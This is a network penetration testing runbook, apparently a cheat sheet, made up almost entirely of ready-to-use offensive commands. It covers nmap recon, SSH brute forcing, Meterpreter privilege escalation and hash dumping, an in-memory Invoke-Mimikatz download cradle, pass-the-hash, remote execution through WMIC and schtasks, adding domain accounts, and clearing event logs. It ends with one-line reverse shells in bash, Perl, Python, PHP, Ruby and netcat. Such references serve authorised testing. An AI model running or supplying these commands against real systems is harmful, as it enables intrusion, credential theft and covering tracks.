# Network Pentesting
A runbook that contains commands and resources for network penetration testing

## Recon

```nmap -sS -O -p1-65535 --script banner 192.168.1.1/24```

Scan all ports and detect OS + banner grab

```nmap -sT -sU -sV -O -p1-65535 --script banner 192.168.1.1/24```

TCP(full connect scan) + UDP scan + service version + OS detection + banner of all ports (slow)

```nmap -sn -n T4 192.168.1.1/24```

Ping scan with no dns resolution

```nmap -Pn -sS -T4 -sV -O --reason -oA filename 192.168.1.1/24```

Port scan all hosts + OS Detection + service version + Output to all formats + port response info

```nmap -p139,445 --script=smb,msrpc,smb-enum-shares,smb-enum-users 192.168.1.1```

Enumerate smb with NSE Scripts

```OSX:  nse(){ find /usr/local/share/nmap/scripts/ -iname *$1* | cut -c32- | cut -d'.' -f1;}```

```Linux: nse(){ find /usr/share/nmap/scripts/ -iname *$1* -printf '%P\n';}``` - hecky

Add custom nse function for searching nse scripts

```rpcclient -U "" 192.168.1.1```

Manual check for null sessions

```nbtscan ```

Scan network for Netbios name information

```enum4linux ```

Enumerate Windows hosts

```FOR /L %x in (1,1,255) do ping -n 1 192.168.2.%x | find /I "reply" >> c:\temp\pingresult.txt```

Ping scan from Windows command line

```1..255 | foreach-object { (new-object System.Net.Networkinformation.Ping).Send("192.168.2.$_") } | where-object {$_.Status -eq "success"} | select Address```

Ping scan with Windows Powershell

```for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep 'from'; done```

Ping scan Linux command line

```for p in {443..443}; do(echo >/dev/tcp/*host*/$p) >/dev/null 2>&1 && echo "$p open" || echo "$p closed"; done```

Port scan Linux command line

```while read site;do curl -ILk $site/jmx-console 2>/dev/null; done < sites.txt```

Find jmx-consoles or other directory from list of sites

```while read ip;do response=$(whois $ip | grep OrgName) && printf "[+]ip address: $ip \n[+]$response \n\n"; done < iplist.txt```

Get whois orgname from list of ip address

```while read site;do status=$(curl -I $site 2>/dev/null | head -1) && echo $site $status; done < iplist.txt```

Get status code from list of ip address

```while read ip;do nmap -n -sL $ip | grep "report for" | cut -d " " -f5 >> iplistoutput;done < iplist.txt ```

Get list of ip addresses from list of cidr blocks in text file

```curl http://cmyip.com/ 2>&1 | grep "My IP Address" | cut -d'>' -f2 | cut -d'<' -f1```

Get public ip address from command line

```openssl s_client -connect sneakerhax.com:443 -showcerts```

View ssl certificate information

## Sub-domain brute force

```nmap --script dns-brute --script-args dns-brute.domain=<domain>,dns-brute.threads=<number of threads>,dns-brute.hostlist=<wordlist>```

Subdomain brute force with Nmap dns-brute NSE script

```python dnsrecon.py -t brt -D *wordlist* -d *domain*```

Subdomain brute force with dnsrecon

## Brute Force

```ncrack -u user -P password_list.txt -p ssh 192.168.1.1```

Run SSH brute force

## Vulnerabiltiy Analysis

```nmap --script smb-check-vulns.nse --script-args=unsafe=1 -p445 <ip address>```

Check for MS08-067 and other SMB vulns

```nmap --script all```

Run all NSE scripts on system

## Privilege escalation
**General**

```whoami ```

Windows or Linux check current user

**Meterpreter**

```meterpreter> getuid```

Display the user that the Meterpreter server is running as on the host

```meterpreter> use post/multi/recon/local_exploit_suggester```

This module suggests local meterpreter exploits that can be used

**Windows** 

```whoami /groups ```

Windows - to check integrity level and permissions

```meterpreter> user post/windows/gather/win_privs```

This module will print if UAC is enabled, and if the current account is ADMIN enabled. It will also print UID,foreground SESSION ID, is SYSTEM status and current process PRIVILEGES

```meterpreter> getsystem```

Attempt to get system privs on Windows system


**Linux**

```id ```

Check permissions of current user

```groups ```

Group membership for current user

```who -r```

Check run level on Linux

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) - g0tmi1k

[Local Linux Enumeration & Privilege Escalation Cheatsheet](https://www.rebootuser.com/?p=1623) - Rebootuser

[Unix Priv Esc Check](http://pentestmonkey.net/tools/audit/unix-privesc-check) - pentestmonkey

[privescalation](https://github.com/expl0i13r/privescalation/blob/master/privescalation.sh) - eXpl0i13r

[linuxprivchecker](http://www.securitysift.com/download/linuxprivchecker.py) - securitysift

[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) - mzet

## Dumping hashes

### Windows

```meterpreter> run post/windows/gather/hashdump```

Dump the local user accounts from the SAM database using the registry

```powershell "IEX (New-Object Net.WebClient).DownloadString('http://<invoke-mimkatz>'); Invoke-Mimikatz -DumpCreds"```

Run Invoke-Mimikatz in memory with Powershell web cradle. You can add all arguments to the end of command

```meterpreter> use post/windows/gather/credentials/domain_hashdump```

Dump hashes from domain controller safely

## Post Exploitation

```post/windows/recon/computer_browser_discovery ```

Uses railgun to discover hostnames and IPs on the network

```post/windows/gather/arp-scanner ```

Scan without pinging boxes

```post/windows/gather/cachedump ```

Dump domain creds

```post/window/gather/checkvm ```

Check if host is a vm

```post/window/gather/credentials/gpp ```

Pulls passwords out from group policy

```post/window/gather/tortoisesvn ```

Windows admins use for svn

```post/window/gather/winscp ```

Secure copy protocol this pulls out passwords

```post/window/gather/dnscache_dump ```

See what sites users have visited

```post/window/gather/enum_applications ```

Finds applications installed on computer

```post/window/gather/enum_chrome ```

Enumerates Chrome Browser

```/enum_ie/enum_firefox ```

Enumerates Firefox Browser

```post/window/gather/enum_termserv ```

Dumps MRU and connection data for RDP sessions

```post/window/gather/enum_anattend ```

check the file system for a copy of unattend.xml and dump password

```post/window/gather/inject_ca ```

Injects cert auth into the box

```post/window/gather/inject_ca ```

Deletes cert auth to remove restrictions
```post/window/gather/wlan/wlan_profile ```

Dumps wifi password in clear text for win7 and above

```post/windows/gather/enum_tokens ```

This module will identify systems that have a Domain Admin (delegation) token on them

A portion of the above list is from the Metasploit Minute Video [here](https://hak5.org/episodes/windows-post-modules-metasploit-minute)

## Capture

[Responder 2.0 - Owing Windows Networks part 2](https://www.trustwave.com/Resources/SpiderLabs-Blog/Owning-Windows-Networks-With-Responder-Part-2/) - SpiderLabs

[Responder 2.0 - Owning Windows Networks part 3](https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/) - SpiderLabs

## Active Directory

```post/window/gather/enum_ad_computers ```

Find computer on the domain very stealth

```post/windows/gather/enum_ad_service_principal_names ```

Find sql servers etc running services

```post/window/gather/enum_ad_user_comments ```

User comments contains passwords for some

```net view /domain```

List domain association

```net view /domain:<domain>```

List hosts on domain. Same as network neighborhood

```net view /domain "Domain Computers"```

List all domain computers

```net view \\<computername>```

List shares on a computer

```net user /domain```

List all users in domain

```net group /domain```

List all groups in domain

```net group /domain "<group name>"```

List users in group on domain

```net user /domain "<user>"```

List information about domain user including group membership

```nltest /dclist:<domain>```

List all domain controllers on domain

```nltest /domain_trust```

Map domain trust

```net localgroup /domain "administrators"```

List all domain controller administrators

```net user username password /ADD```

Add local user account

```net user username password /ADD /DOMAIN```

Add new user account to domain

```wmic useraccount```

List all local accounts with SID

```Get-AdUser -Filter * -Properties SamAccountName, description | select SamAccountName, description | select -expand $_.results```

Get descriptions from AD to look for passwords stored in AD account. Can be done from any domain user

## Lateral Movement

```dir \\host\c$```

Check to see if your admin on another computer by listing the c$ share

```runas /user:Domain\(user) something.exe```

Create a token with creds from command line

```runas /user:Domain\(user) /netonly something.exe```

Create a token to pass creds

```sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND```

Pass the hash with Mimikatz

```SCHTASKS /Run /S system /U user /P password /I /TN "taskname"```

Run task immediately on remote system

```wmic /node:(host) process call create <path to exe>```

Run exe on remote computer with WMIC

```Powershell Invoke-Command -ComputerName (host) -ScriptBlock { dir c:\ }```

WinRM(port 5985) turned off by default(turned on for administration) Run command with Windows remoting

## Cleaning up

```meterpreter> clearev```

Will clear the Application, System and Security logs on a Window systems. There are no options or arguments

## Misc

```rundll32.exe dllname.dll,StartW```

Run DLL

```dir /S /B```

Dirwalk Windows

```meterpreter> use post/window/manage/payload_inject```

Create a new shell on box you already owned. 2 is 1 and 1 is none. Can be used to send session to another user

## Reverse Shells

### Bash

```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

### Perl

```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

### Python

```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

### Python Psuedo terminal

```python -c "import pty;pty.spawn('/bin/bash')"```

Use this on raw shells

### PHP

```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```

### Ruby

```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

### Netcat

```nc -e /bin/sh 10.0.0.1 1234```

Reverse shell Linux

```nc 10.10.0.1 1234 -e cmd.exe```

Reverse shell Windows

### References

[Reverse shell cheat sheet](Reverse shell cheat sheet) - Pentestmonkeys

[Netcat cheat sheet v1](http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) - Sans Penetration Testing
